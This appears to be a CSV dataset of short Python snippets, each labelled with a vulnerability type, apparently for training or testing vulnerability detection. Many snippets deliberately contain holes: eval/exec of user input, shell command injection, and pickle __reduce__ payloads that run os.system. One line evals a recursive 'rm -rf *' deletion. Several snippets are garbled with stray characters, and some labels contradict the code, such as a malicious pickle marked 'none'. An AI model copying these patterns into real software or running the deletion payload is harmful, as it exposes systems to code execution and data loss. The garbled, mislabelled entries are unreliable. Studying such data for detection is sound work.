snippet,vulnerability
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username = ?"", (username,))
    user_info = cursor.fetchone()
    return user_info
print(get_user_info(""john""))",['none']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
serialize_and_deserialize(vulnerable_object)",['insecure_deserialization']
"import subprocess
def run_command(user_input):
    command = [""ls"", user_input]
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
def run_eval(user_input):
    try:
        result = eval(user_input, {""__builtins__"": {}})
        print(result)
    except SyntaxError:
        print(""Invalid expression"")
if __name__ == ""__main__"":
    user_input = input(""Enter your command: "")
    run_command(user_input)
    run_eval(user_input)","['arbitrary_code_exec', 'command_injection']"
"import os
import subprocess
def execute_command(user_input):
    with open('myfile.txt', 'w') as f:
        f.write(user_input)
execute_command(""A""*10000000)",['none']
"import subprocess
def run_command(user_input):
    command = [""echo"", ""Hello, "" + user_input]
    subprocess.run(command, shell=False)
def sanitize_input(user_input):
    return user_input.replace("";"", """").replace(""&"", """").replace(""|"", """")
while True:
    user_input = input(""Enter your name: "")
    sanitized_input = sanitize_input(user_input)
    run_command(sanitized_input)",['command_injection']
"import pickle
import subprocess
class RunBinSh(object):
    def __init__(self):
        self.command = '/bin/sh'
    def __getstate__(self):
        raise TypeError(""Object of type RunBinSh cannot be pickled"")
def serialize_exploit():
    malicious = RunBinSh()
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        malicious = pickle.load(f)
    subprocess.Popen([malicious.command], shell=True)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"from flask import Flask, request, abort
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    if code:
        restricted_keywords = ['eval', 'exec', 'import', 'open', 'os', 'read', 'write', 'system', 'subprocess']
        if any(keyword in code for keyword in restricted_keywords):
            abort(400, 'Restricted keywords found in the code')
        else:
            exec(code)
            return 'Code executed'
    else:
        abort(400, 'No code provided')
if __name__ == ""__main__"":
    app.run(debug=True)",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Import(self, node):
        raise ValueError(""Imports are not allowed"")
    def visit_ImportFrom(self, node):
        raise ValueError(""Imports are not allowed"")
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == ""__import__"":
            raise ValueError(""Imports are not allowed"")
        self.generic_visit(node)
def evaluate_input(user_input):
    tree = compile(user_input, ""<input>"", ""exec"")
    RestrictedPython().visit(tree)
    exec(tree)
while True:
    user_input = input(""Enter some Python code: "")
    try:
        evaluate_input(user_input)
    except Exception as e:
        print(f""Error: {e}"")",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
user_input = input(""Enter your value: "")
run_command(user_input)",['command_injection']
"import os
def read_file(filename):
    try:
        with open(filename, 'r') as f:
            return f.read()
    except FileNotFoundError:
        print(f""File {filename} not found."")
        return None
def write_file(filename, content):
    try:
        with open(filename, 'w') as f:
            f.write(content)Bs
    except IOError:
        print(f""Error writing to file {filename}."")
def delete_file(filename):
    try:
        os.remove(filename)
    except FileNotFoundError:
        print(f""File {filename} not found."")
def main():
    filename = 'test.txt'
    content = 'This is some content.'
    write_file(filename, content)
    print(read_file(filename))
    delete_file(filename)
if __name__ == ""__main__"":
    main()",['none']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_exploit():
    with open('data.pkl', 'wb') as f:
        pickle.dump(EvilPickle(), f)
serialize_exploit()",['none']
"import time
import sys
sys.setrecursionlimit(3000)
def infinite_recursion(n):
    if n > 0:
        print(""Recursion number: "", n)
        time.sleep(1)
        infinite_recursion(n+1)
infinite_recursion(1000)",['none']
"import re
def sanitize_input(user_input):
    if re.search('[a-zA-Z_]', user_input):
        return False
    return True
def unsafe_eval(user_input):
    if sanitize_input(user_input):
        return eval(user_input)
    else:
        raise ValueError(""Invalid input"")
unsafe_eval(""__import__('os').system('rm -rf *')"")",['arbitrary_code_exec']
"import os
from flask import Flask, request
app = Flask(__name__)
@app.route('/')
def my_form():
    return '''
        <form method=""POST"">
            <input name=""text"">
            <input type=""submit"">
        </form>'''
@app.route('/', methods=['POST'])
def my_form_post():
    text = request.form['text']
    eval(text)
    Return ''",['arbitrary_code_exec']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.message = ""You have been hacked!""
    def __reduce__(self):
        return (subprocess.run, (['echo', self.message],))
def serialize_and_deserialize(safe_obj):
    serialized = pickle.dumps(safe_obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_obj = SafeClass()
deserialized_obj = serialize_and_deserialize(safe_obj)",['insecure_deserialization']
"import os
def run_user_input():
    user_input = input(""Enter command: "")
    eval(user_input)
run_user_input()",['arbitrary_code_exec']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()妆
    query = ""SELECT * FROM users WHERE username=?""
    cursor.execute(query, (username,))
    user_info = cursor.fetchone()
    return user_info
username = input(""Enter your username: "")
print(get_user_info(username))",['none']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id not in ['print', 'open']:
            raise ValueError('Function call not allowed')
        self.generic_visit(node)
def restricted_eval(code):
    tree = compile(code, filename=""<ast>"", mode=""eval"")
    visitor = RestrictedPython()
    visitor.visit(tree)
    return eval(code)
def vulnerable_function():
    user_input = input(""Enter something: "")
    try:
        restricted_eval(user_input)
    except Exception as e:
        print(f""Invalid input: {e}"")
vulnerable_function()",['arbitrary_code_exec']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked!""'
    def __reduce__(self):
        return (subprocess.run, (self.command,))
safe_object = SafeClass()
serialized_object = pickle.dumps(safe_object)
deserialized_object = pickle.loads(serialized_object)",['insecure_deserialization']
"import time
def login():
    username = input(""Enter your username: "")
    password = input(""Enter your password: "")
    if username == ""admin"" and password == ""password"":
        return True
    else:
        return False
def main():
    if login():
        command = input(""Enter a command: "")
        if command.lower().startswith('exec') or command.lower().startswith('eval'):
            print(""Invalid command. Please enter a valid command."")
        else:
            exec(command)
    else:overed.
        print(""Login failed."")
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""I am evil!"" > /tmp/evil_output.txt',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
if __name__ == '__main__':
    evil_instance = EvilClass()
    deserialized_instance = serialize_and_deserialize(evil_instance)
    deserialized_instance()",['insecure_deserialization']
"import os
def vulnerable_function():
    user_input = input(""Enter something: "")
    eval(user_input)
vulnerable_function()",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Not allowed')
        ast.NodeVisitor.generic_visit(self, node)
def run_user_input():
    user_input = input(""Enter your command: "")
    tree = compile(user_input, ""<string>"", ""exec"")
    for item in tree.body:
        RestrictedPython().visit(item)
    exec(tree)
run_user_input()",['arbitrary_code_exec']
"import os
def evaluate_user_input():
    user_input = input(""Enter some Python code to evaluate: "")
    eval(user_input)
evaluate_user_input()",['arbitrary_code_exec']
